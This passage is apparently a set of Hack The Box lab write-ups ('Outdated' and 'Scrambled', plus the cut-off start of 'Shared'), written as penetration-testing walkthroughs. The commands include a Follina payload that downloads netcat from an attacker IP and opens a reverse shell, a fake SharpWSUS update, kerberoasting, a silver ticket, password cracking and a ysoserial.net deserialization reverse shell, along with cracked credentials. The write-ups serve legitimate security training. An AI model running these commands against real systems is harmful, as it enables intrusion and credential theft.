Windows RPC over HTTP 1.0  \n636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)  \n|_ssl-date: 2022-08-17T19:20:39+00:00; +6h59m54s from scanner time.  \n| ssl-cert: Subject:  \n| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED  \n| Not valid before: 2022-06-18T05:50:24  \n|_Not valid after: 2024-06-18T06:00:24  \n3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)  \n|_ssl-date: 2022-08-17T19:20:39+00:00; +6h59m54s from scanner time.  \n| ssl-cert: Subject:  \n| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED  \n| Not valid before: 2022-06-18T05:50:24  \n|_Not valid after: 2024-06-18T06:00:24  \n3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)  \n|_ssl-date: 2022-08-17T19:20:39+00:00; +6h59m54s from scanner time.  \n| ssl-cert: Subject:  \n| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED  \n| Not valid before: 2022-06-18T05:50:24  \n|_Not valid after: 2024-06-18T06:00:24  \n5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  \n|_http-server-header: Microsoft-HTTPAPI/2.0  \n|_http-title: Not Found  \n8530/tcp open http Microsoft IIS httpd 10.0  \n|_http-server-header: Microsoft-IIS/10.0  \n|_http-title: Site doesn't have a title.  \n| http-methods:  \n|_ Potentially risky methods: TRACE  \n8531/tcp open unknown  \n9389/tcp open mc-nmf .NET Message Framing  \n49667/tcp open msrpc Microsoft Windows RPC  \n49679/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  \n49680/tcp open msrpc Microsoft Windows RPC  \n49683/tcp open msrpc Microsoft Windows RPC  \n49918/tcp open msrpc Microsoft Windows RPC  \n49924/tcp open msrpc Microsoft Windows RPC  \n56328/tcp open msrpc Microsoft Windows RPC  \nService Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n```\nSMTP port open (25) +  WSUS port open (8530)\n\n### smbclient\n| Sharename | Type | Comment |\n|-------------|------|-----------|\n|ADMIN$| Disk |Remote Admin  |\n|C$| Disk |Default share  |\n|IPC$| IPC Remote IPC  |\n|NETLOGON| Disk Logon server share  |\n|Shares| Disk  |\n|SYSVOL Disk| Logon server share  |\n|UpdateServicesPackages | Disk |A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system. |\n|WsusContent| Disk| A network share to be used by Local Publishing to place published content on this WSUS system.  |\n|WSUSTemp | Disk | A network share used by Local Publishing from a Remote WSUS Console Instance.|\n\nInside the *Shares* directory, we can retrieve a pdf file with a listing of multiple CVEs to patch. \nIt also ask to send an email to *itsupport@outdated.htb* with a link to any malicious site or endpoint in order to protect the system or whatever against it. \n\nLet's try exploiting those CVEs one by one then!\n\n## User\n\u003eLuckily, the first was the right one !\n\nUsing the follina exploit script from [here](https://github.com/chvancooten/follina.py) we can serve a malicious document along side netcat.\n\n```\n\u003e python follina.py -t docx -m command -c \"Start-Process c:\\windows\\system32\\cmd.exe -WindowStyle hidden -ArgumentList '/c powershell curl 10.10.X.X:8000/nc64.exe -o c:\\windows\\tasks\\nc.exe; c:\\windows\\tasks\\nc.exe -e cmd.exe 10.10.X.X XXXX'\"\n\u003e swaks --to itsupport@outdated.htb --body \"http://10.10.X.X/exploit.html\"\n\u003e nc -lnvp XXXX\n```\n\nWe're in  as user btables@outdated.htb ! Let's use groundhog / winpeas !\n![[Pasted image 20220818193654.png]]\n\nShadowCreds to the user *sflowers*.. nice !\n\nUsing `Whisker` from [here (uncompiled)](https://github.com/eladshamir/Whisker)  or [here (compiled and obfuscated)](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries)and Rubeus:\n\n\u003e I used the PowerSharpBinaries, as i didn't wanted to compile the C# project.\n\u003e PowerSharpPack is realy usefull\n\n```\n\u003e ./Whisker.exe add /target:sflowers\n\u003e ./Rubeus.exe \u003cthe rest of the command Whisker gave as an output\u003e\n```\n\nGot the NT hash of *sflowers*: 1FCDB1F6015DCB318CC77BB2BDA14DB5\n\nLet's use it with evil-winrm...\n\nGot user.txt\n\n## LPE\n\u003e Obviously, WSUS is the target here. Let's cut to the chase and directly try to exploit it...\n\n\u003e Thx hAAAAAAAAAAAAAAAAcktricks\n\u003e https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus\n\nThe system appears to be vulnerable.\n\nWe can use sharpWSUS from the [PowerSharpPack toolbox](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) in order to fake an update and create a reverse shell using previously uploaded netcat.\nWe need to upload PsExec64.exe \n\n```\n\u003e nc -lnvp 4444\n\u003e ./SharpWSUS create /payload:\"C:\\Users\\sflowers\\Desktop\\PsExec64.exe\" /args:\"-accepteula -s -d cmd.exe /c \\\"c:\\windows\\tasks\\nc.exe -e cmd.exe 10.10.X.X XXXX\\\"\" /title:\"azerazer\" # create a new udpate\n\u003e SharpWSUS approve /updateid:\u003cupdate_id\u003e /computername:dc.outdated.htb /groupname:\"azerazer\" # approve it\n\u003e SharpWSUS check /updatedid:\u003cupdate_id /computername:dc.outdated.htb # check wether it has been installed or not. \n```\nWait for a bit and you've got your revshell.\n\nAAAAAAAAAAAAAAAA","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Medium/Scrambled/Scrambled":{"title":"HTB - Scrambled","content":"\n## Foothold\n### Nmap\n```\nPORT STATE SERVICE VERSION  \n53/tcp open domain Simple DNS Plus  \n80/tcp open http Microsoft IIS httpd 10.0  \n|_http-server-header: Microsoft-IIS/10.0  \n|_http-title: Scramble Corp Intranet  \n| http-methods:  \n|_ Potentially risky methods: TRACE  \n88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-19 22:07:25Z)  \n135/tcp open msrpc Microsoft Windows RPC  \n139/tcp open netbios-ssn Microsoft Windows netbios-ssn  \n389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)  \n|_ssl-date: 2022-08-19T22:10:31+00:00; 0s from scanner time.  \n| ssl-cert: Subject: commonName=DC1.scrm.local  \n| Subject Alternative Name: othername:\u003cunsupported\u003e, DNS:DC1.scrm.local  \n| Not valid before: 2022-06-09T15:30:57  \n|_Not valid after: 2023-06-09T15:30:57  \n445/tcp open microsoft-ds?  \n464/tcp open kpasswd5?  \n593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  \n636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)  \n| ssl-cert: Subject: commonName=DC1.scrm.local  \n| Subject Alternative Name: othername:\u003cunsupported\u003e, DNS:DC1.scrm.local  \n| Not valid before: 2022-06-09T15:30:57  \n|_Not valid after: 2023-06-09T15:30:57  \n|_ssl-date: 2022-08-19T22:10:31+00:00; 0s from scanner time.  \n1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM  \n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  \n| Not valid before: 2022-08-19T12:42:00  \n|_Not valid after: 2052-08-19T12:42:00  \n|_ssl-date: 2022-08-19T22:10:31+00:00; 0s from scanner time.  \n4411/tcp open found?  \n| fingerprint-strings:  \n| DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:  \n| SCRAMBLECORP_ORDERS_V1.0.3;  \n| FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:  \n| SCRAMBLECORP_ORDERS_V1.0.3;  \n|_ ERROR_UNKNOWN_COMMAND;  \n5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  \n|_http-server-header: Microsoft-HTTPAPI/2.0  \n|_http-title: Not Found  \n9389/tcp open mc-nmf .NET Message Framing  \n49667/tcp open msrpc Microsoft Windows RPC  \n49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  \n49674/tcp open msrpc Microsoft Windows RPC  \n49700/tcp open msrpc Microsoft Windows RPC  \n49704/tcp open msrpc Microsoft Windows RPC  \n62080/tcp open msrpc Microsoft Windows RPC\n```\nBasic windows box, with one website, one mssql DB and a weird service on port 4411\n\nOne of the pages gives us some info:\n1. a mail address: *support@scramblecorp.com*\n2. a potential user on the machine: *ksimpson*\n\nWe also learn that NTLM is disabled and thus make kerberos auth the only way to auth against the server.\n\nThat implies that we cannot connect to the SMB server as guest user.\nAt least, we got the domain name and the servers FQDN: *scrm.local* and *d1.scrm.local*\n\nLet's check if *ksimpson* is actually a domain user using [kerbrute]([https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute))\n\n```  \n\u003e echo \"ksimpson\" \u003e ksimpson.txt\n\u003e ../Downloads/kerbrute_linux_amd64 userenum --dc scrm.local --domain scrm.local ksimpson.txt  \n  \n__ __ __  \n/ /_____ _____/ /_ _______ __/ /____  \n/ //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\  \n/ ,\u003c / __/ / / /_/ / / / /_/ / /_/ __/  \n/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/  \n  \nVersion: v1.0.3 (9dad6e1) - 08/20/22 - Ronnie Flathers @ropnop  \n  \n2022/08/20 07:42:01 \u003e Using KDC(s):  \n2022/08/20 07:42:01 \u003e scrm.local:88  \n  \n2022/08/20 07:42:01 \u003e [+] VALID USERNAME: ksimpson@scrm.local  \n2022/08/20 07:42:02 \u003e Done! Tested 208 usernames (2 valid) in 0.712 seconds  \n```\nIt is!\n\nWith a little bit of hope and a [word list generator]([https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)) let's try to bruteforce the password of *ksimpson*. If the generated word list is not enough, we'll use *rockyou.txt*.\n\n```  \n\u003e ../Downloads/kerbrute_linux_amd64 bruteuser --dc scrm.local --domain scrm.local ksimpson.txt ksimpson  \n  \n__ __ __  \n/ /_____ _____/ /_ _______ __/ /____  \n/ //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\  \n/ ,\u003c / __/ / / /_/ / / / /_/ / /_/ __/  \n/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/  \n  \nVersion: v1.0.3 (9dad6e1) - 08/20/22 - Ronnie Flathers @ropnop  \n  \n2022/08/20 07:44:42 \u003e Using KDC(s):  \n2022/08/20 07:44:42 \u003e scrm.local:88  \n  \n2022/08/20 07:44:43 \u003e [+] VALID LOGIN: ksimpson@scrm.local:ksimpson  \n2022/08/20 07:44:43 \u003e Done! Tested 127 logins (1 successes) in 1.585 seconds  \n```\nNice! We got user *ksimpson* with password *ksimpson*, how original!\n\nSince NTLM is disabled, we can't login with just an username and a password. Let's get a TGT for *ksimpson*:\n\n```  \n\u003e impacket-getTGT -dc-ip scrm.local scrm.local/ksimpson:ksimpson  \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation  \n  \n[*] Saving ticket in ksimpson.ccache  \n  \n\u003e export KRB5CCNAME=ksimpson.ccache  \n```\n\nNow, the tricky part. \n\nAgain, NTLM is disabled. This forces us to use our tools from impacket in a bit different way. A particular tool called `GetUserSPNs` gives us some trouble in it's usage.\nIn fact, using `GetUserSPNs` against a server using the `-k` option (the one to use kerberos auth) crashes if the server have NTLM auth disabled. Which is exactly our case.\n\nAfter some research, I found this [GitHub issue](https://github.com/SecureAuthCorp/impacket/issues/1206) . It was opened by the author of the box, VbScrub. In one the comments of the issue, we retrieve a patch to the script made again by VbScrub. Let's try to see if it works now:\n\n```  \n\u003e impacket-GetUserSPNs -dc-ip dc1.scrm.local scrm.local/ksimpson -request -k -no-pass  \n  \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation  \n  \nServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation  \n---------------------------- ------ -------- -------------------------- -------------------------- ----------  \nMSSQLSvc/dc1.scrm.local:1433 sqlsvc 2021-11-03 12:32:02.351452 2022-08-19 11:36:27.165001  \nMSSQLSvc/dc1.scrm.local sqlsvc 2021-11-03 12:32:02.351452 2022-08-19 11:36:27.165001  \n  \n  \n  \n$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$9fb10606d36c78f75369417734abee3a$6238bc62414b9150aa851219f5a9f2f59f98e5bd5fcf3e5806117a1637c4cc3cfed6bb27548321c7464c8837b4dabd2dc10022c991f8e6b7306372ce01973f80ddd03ecf9b7766c79584f48772863676aece2d48385c16f551f4cb8caf625376e4314c97a6145edf92536edbca3fe03e796653eded6c9982ca7ded92e21867ff52501f67611fcd81eef62a9848755cb9f94e4f9338cb6b5d871c158ef981a4162efbbc0995dffdd9dee1ce687ce67cd53661d081da33303f08eccc4dc83bb963af2ebb6e9bfd25f66880648c7face7b4f0d976e13e3181cfe480203a6aad896fa626296e0908b909a007e949f9ca971b5287fa941fcd52be0f401121374e6477fc95bb1167433d7bb4a67aa89e532bd08e51e7df25b6ab7226a89e45573639d36eaa934f00eb262813464705006c920bccd6b2d8badc9f7db13abc40f3a712ef60431c6f4c2fedcf479abdc318e30a2352c21318be9e971fca46acbc55725d72a1f272d95abf8030e986ce1e55563575a5489832076c46145163509ff9560776be4f44b5dedce58ed4111c93e52f3da9d1faed7fde6e80d09965cedf9dacfa4918fef23d04a8ad7a628b8828a72d7311b2e3381c508a4bd101cfcbf74425399f49b3917901332fc882253ccd84890cec248d1bd45c252aa6c5b375d62310438145291c48336b1c94ab0b546e6b9d5b5499c74be903022a3f0c4e5f43992dec8e3ea5b8dd3e66e2ec41a2344eddb386bc8ecce278621f3ae4afb7e30930b27cccbb94b4bda8de78d0a4e9050bd45eaa4cbfba6f43c26ad9566b8c676761ce75915b5d57a8fd1a4f8bf84d150581abbe2cd90830539e5dc1b8744a4c305323c0f209d2b06dafde1a7fe14b6f30ad0241c189eb4cd43c5764c476a87ea1f9fc4b9f106426f94e36fbdfebb5999bfb38fedc68c6f3d310a9caf7b295f9431c204aa46db6b599b431644e28e7fd369093d83c986d0c60413e8b9df06279c98ab48d8d8e7696443e7795a61b1d720cfa0906d77ea0428cb57ef552cffd1ba385c3c8b01a3a58730760cdb1f247d29af857aac740b2eb0ad25e57ff3e9841011dcf69e7a4eb8fdb25f4e4467ed43b677c5ba639ad31d1c5e4c21e64ccfa115c41e6269f45549d38c11aba92369a8c784077da4cae3d28e9845500ea3f68fdd6727e743a0c2c1a7b7b78cb1cd9d1a59a46bb14b2c1f159001e5bce68a1c1591671758c465682e8fc628610626f3abcf80c937de04dd4cf7b81540fc2f068f77447558a0080952f40ccedc6151447f61bbac12ef32c18eb6e79e144a7a0258382162bbe26eaa6be6e4cba312b59481428fd1a6b6397376ae562c3f492f4ba5701dbe0030cba26219d8a4cd6fd9d0be5a057d51f9cf0bc620e6ca935fda2f757323a04d2a83c5dd5658bf3d34a755e6b334b0be0d948570ef1f5b15c460761e1  \n```\nIt does ! And we get a TGS ticket for the user `sqlsvc`. We can bruteforce it using JTR:\n\n```  \n\u003e john --wordlist=/usr/share/wordlists/rockyou.txt sql_svc_hash  \n  \nUsing default input encoding: UTF-8  \nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  \nWill run 4 OpenMP threads  \nPress 'q' or Ctrl-C to abort, almost any other key for status  \nPegasus60 (?)  \n1g 0:00:00:11 DONE (2022-08-20 08:08) 0.08673g/s 930569p/s 930569c/s 930569C/s Penrose..Pearce  \nUse the \"--show\" option to display all of the cracked passwords reliably  \nSession completed.  \n```\nOkay, so we got *sqlsvc* password: *Pegasus60*. Nice !\n\nAfter some unfortunate attempts to login to the *mssql* service (I forgot about NTLM being disabled and the fact that I needed a ticket to get the right to use the *mssql* service). I tried going back to the SMB service. Since NTLM is disabled, let's use `impacket-smbclient` instead of the normal `smbclient` :\n\n```  \n\u003e impacket-smbclient -no-pass -k scrm.local/sqlsvc@dc1.scrm.local  \n  \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation  \n  \nType help for list of commands  \n#  \n```  \nOk, we got a way in. Let's list available shares:  \n\n```  \n# shares  \n  \nADMIN$  \nC$  \nHR  \nIPC$  \nIT  \nNETLOGON  \nPublic  \nSales  \nSYSVOL  \n```  \nCan't access _Sales_ share with this user, let's try _Public_  \n  \n```  \n# use Public  \n# ls  \n  \ndrw-rw-rw- 0 Thu Nov 4 18:23:19 2021 .  \ndrw-rw-rw- 0 Thu Nov 4 18:23:19 2021 ..  \n-rw-rw-rw- 630106 Fri Nov 5 13:45:07 2021 Network Security Changes.pdf  \n# get Network Security Changes.pdf  \n```\n\nThe contents of the PDF confirms that they're aware of NTLM relaying attack and thus disabled NTLM auth.\nWe also learn that they got credentials stolen from them inside an SQL database =\u003e Are the creds still inside ?  \nThey've removed all access to the SQL service for everyone apart from network admins =\u003e \nGetting a ticket for the mssql service will not be enough.\nWe can create a silver ticket for the *mssql* service for the *Administrator* user.\n\nSince we have a clear path: Connecting to the DB to see if there still is some creds stored. Let's get this silver ticket. \nTo achieve that, we'll need 3 info: \n- An SPN that we can use. We already have that, it's the `MSSQLSvc/dc1.scrm.local:1433` service.\n- The domain SID.\n- The NT hash of the user that will sign the ticket. In our case *sqlsvc*\n- The user id for the user the ticket will be created for. In our case Administrator so: `500 Administrator`\n\n### Domain SID\nWe can use `secretsdump` with debug enabled (`-d`) to dump the SID instead of manually doing an lsaquery with rpcclient.\n\n```  \n\u003e impacket-secretsdump -k scrm.local/sqlsvc@dc1.scrm.local -no-pass -debug  \n  \n[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket  \n[+] Using Kerberos Cache: sqlsvc.ccache  \n[+] SPN CIFS/DC1.SCRM.LOCAL@SCRM.LOCAL not found in cache  \n[+] AnySPN is True, looking for another suitable SPN  \n[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL  \n[+] Using TGT from cache  \n[+] Trying to connect to KDC at SCRM.LOCAL  \n[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user  \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)  \n[*] Using the DRSUAPI method to get NTDS.DIT secrets  \n[+] Session resume file will be sessionresume_uKHJCEUr  \n[+] Trying to connect to KDC at SCRM.LOCAL  \n[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500  \n[+] Calling DRSGetNCChanges for {edaf791f-e75b-4711-8232-3cd66840032a}  \n```\n\u003e don't forget to remove the last part of the outputted SID !  \n  \ndomain SID: S-1-5-21-2743207045-1827831105-2542523200\n\n### *sqlsvc* NT hash\nWe can use this [tool]([https://codebeautify.org/ntlm-hash-generator](https://codebeautify.org/ntlm-hash-generator)) to generate the hash:\n`Pegasus60` =\u003e `B999A16500B87D17EC7F2E2A68778F05`\n\nOkay, we've got everything we need to create our silver ticket. Let's use `impacket-ticketer` to create it.\n\n```  \nimpacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200  \n  \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation  \n  \n[*] Creating basic skeleton ticket and PAC Infos  \n[*] Customizing ticket for scrm.local/Administrator  \n[*] PAC_LOGON_INFO  \n[*] PAC_CLIENT_INFO_TYPE  \n[*] EncTicketPart  \n[*] EncTGSRepPart  \n[*] Signing/Encrypting final ticket  \n[*] PAC_SERVER_CHECKSUM  \n[*] PAC_PRIVSVR_CHECKSUM  \n[*] EncTicketPart  \n[*] EncTGSRepPart  \n[*] Saving ticket in Administrator.ccache  \n```\n\nLet's use this ticket to connect to the *mssql* service using `mssqlclient`:\n\n```\n\u003e export KRB5CCNAME=Administrator.ccache\n\u003e impacket-mssqlclient dc1.scrm.local -k -no-pass\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC1): Line 1: Changed database context to 'master'.\n[*] INFO(DC1): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL\u003e\n```\n\u003e Don't forget to use the FQDN of the target (here, *dc1.scrm.local*) instead of just the domain name (*scrm.local*)\n\nWe're in !\n\n## User\nLet's find out if they removed the creds that were stolen by the attacker from the last time.  \n  \n```  \nSQL\u003e select name from sys.databases; # let's display all the DB inside MSSQL  \n  \nname  \n--------------------------------------------------------------------------------------------------------------------------------  \nmaster  \ntempdb  \nmodel  \nmsdb  \nScrambleHR  \n  \nSQL\u003e use ScrambleHR;  \n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR  \n[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.  \n  \nSQL\u003e select table_name from information_schema.TABLES;  \n  \ntable_name  \n--------------------------------------------------------------------------------------------------------------------------------  \nEmployees  \nUserImport  \nTimesheets  \n  \nSQL\u003e select * from UserImport;  \n  \nLdapUser LdapPwd LdapDomain RefreshInterval IncludeGroups  \n-------------------------------------------------- -------------------------------------------------- -------------------------------------------------- --------------- -------------  \nMiscSvc ScrambledEggs9900 scrm.local 90 0  \n```  \nNice we go the creds of _MiscSvc_ with the password _ScrambledEggs9900_  \n  \nWe can use them to interact with DC1 :  \n\u003e Thx hAAAAAAAAAAAAAAAAtricks [https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#sudo](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#sudo)  \n  \n```  \n$pass = ConvertTo-SecureString ‘ScrambledEggs9900’ -AsPlainText -Force  \n$cred = New-Object System.Management.Automation.PSCredential(\"MiscSvc\", $pass)  \n  \nInvoke-Command -Computer DC1 -ScriptBlock { whoami } -Credential $cred  \n...  \n```  \n  \nWe got a revshell on *MiscSvc* and the user flag\n\n## LPE\nUpon entering the machine as *miscsvc*  we can see 2 files:\n\n```  \nPS C:\\Users\\miscsvc\\Documents\u003e ls  \nDirectory: C:\\Users\\miscsvc\\Documents  \n  \nMode LastWriteTime Length Name  \n---- ------------- ------ ----  \n-a---- 05/11/2021 20:52 86528 ScrambleClient.exe  \n-a---- 05/11/2021 20:52 19456 ScrambleLib.dll  \n```\nLet's download them\n\nScrambleClient.exe is the client that we saw inside the website that connects to the port 4411. Everything connects.\n\nJudging the output of `strings ScrambleClient.exe`, *ScrambleClient.exe* seems to be an *VB* app. *ScrambleLib.dll* however is a dynamic linked library that seems to be created with .NET\n\nUsing netcat on the machine at the 4411, it seems we can interact with it via sending orders like so: \n\n```\n\u003e nc  10.10.11.168 4411\n\nSCRAMBLECORP_ORDERS_V1.0.3;\nUPLOAD_ORDER;\nERROR_GENERAL;Error deserializing sales order: Attempting to deserialize an empty stream.\n```\nWait *deserializing*... ? That's nice. let's find the function used to deserialize orders then !\n\n```\n\u003e strings ScrambleLib.dll |grep seria   \n\nDeserializeFromBase64\nDeserialize\n```\n\nFrom this we can use this tool called [ysoserial](https://github.com/frohoff/ysoserial) and the .NET version since we're deserializing in .NET [ysoserial.net](https://github.com/pwntester/ysoserial.net) \n\n```\n\u003e nc -lnvp 4450\n\u003e .\\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \"C:\\Users\\miscsvc\\Documents\\nc.exe 10.10.14.174 4450\"\n\nAAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAgApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBNEFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1WMFkyRjBMbVY0WlNBdFpTQndiM2RsY25Ob1pXeHNJREV3TGpFd0xqRTBMakUzTkNBME5ETWlJRk4wWVc1a1lYSmtSWEp5YjNKRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGTjBZVzVrWVhKa1QzVjBjSFYwUlc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVmMyVnlUbUZ0WlQwaUlpQlFZWE56ZDI5eVpEMGllM2c2VG5Wc2JIMGlJRVJ2YldGcGJqMGlJaUJNYjJGa1ZYTmxjbEJ5YjJacGJHVTlJa1poYkhObElpQkdhV3hsVG1GdFpUMGlZMjFrSWlBdlBnMEtJQ0FnSUNBZ1BDOXpaRHBRY205alpYTnpMbE4wWVhKMFNXNW1iejROQ2lBZ0lDQThMM05rT2xCeWIyTmxjM00rRFFvZ0lEd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEkrQ3c9PQs=\n```\n\nAnd just with that we've got our admin access and root flag !\n\n\nAAAAAAAAAAAAAAAA","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Medium/Shared/Shared":{"title":"HTB - Shared","content":"\n## Foothold\n### Nmap\n```\nPORT STATE SERVICE VERSION  \n22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  \n| ssh-hostkey:  \n| 3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)  \n| 256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)  \n|_ 256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)  \n80/tcp open http nginx 1.18.0  \n|_http-server-header: nginx/1.18.0  \n|_http-title: Did not follow redirect to [https://shared.htb/](https://shared.htb/)  \n| http-robots.txt: 81 disallowed entries (15 shown)  \n| /*?order= /*?tag= /*?id_currency= /*?search_query=  \n| /*?back= /*?n= /*\u0026order= /*\u0026tag= /*\u0026id_currency=  a\n| /*\u0026search_query= /*\u0026back= /*\u0026n= /*controller=addresses  \n|_/*controller=address /*controller=authentication  \n443/tcp open ssl/http nginx 1.18.0  \n|_ssl-date: TLS randomness does not represent time  \n|_http-server-header: nginx/1.18.0  \n| tls-nextprotoneg:  \n| h2  \n|_ http/1.1  \n| tls-alpn:  \n| h2  \n|_ http/1.1  \n| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US  \n| Not valid before: 2022-03-20T13:37:14  \n|_Not valid after: 2042-03-15T13:37:14  \n|_http-trane-info: Problem with XML parsing of /evox/about  \n| http-robots.txt: 81 disallowed entries (15 shown)  \n| /*?order= /*?tag= /*?id_currency= /*?search_query=  \n| /*?back= /*?n= /*\u0026order= /*\u0026tag= /*\u0026id_currency=  \n| /*\u0026search_query= /*\u0026back= /*\u0026n= /*controller=addresses  \n|_/*controller=address /*controller=authentication  \n| http-title: Shared Shop  \n|_Requested resource was [https://shared.htb/index.php](https://shared.htb/index.php)  \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\nBasic https website, 